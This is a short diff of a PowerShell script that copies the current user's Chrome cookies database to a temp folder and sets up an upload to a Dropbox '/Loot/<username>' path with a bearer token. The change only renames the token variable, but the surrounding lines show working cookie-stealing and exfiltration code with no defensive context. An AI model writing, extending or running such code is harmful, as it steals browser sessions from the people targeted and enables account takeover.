@@ -1,4 +1,3 @@
-$accessToken = "$db"
 $cookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
 $filePath = "$env:temp\Cookies"
 $destinationPath = "/Loot/$env:USERNAME/Cookies"
@@ -7,7 +6,7 @@ Copy-Item -Path $cookiesPath -Destination $filePath -Force
 
 try {
     $headers = @{
-        "Authorization" = "Bearer $accessToken"
+        "Authorization" = "Bearer $db"
         "Content-Type" = "application/octet-stream"
         "Dropbox-API-Arg" = '{"path": "' + $destinationPath + '", "mode": "add", "autorename": true, "mute": false}'
     }
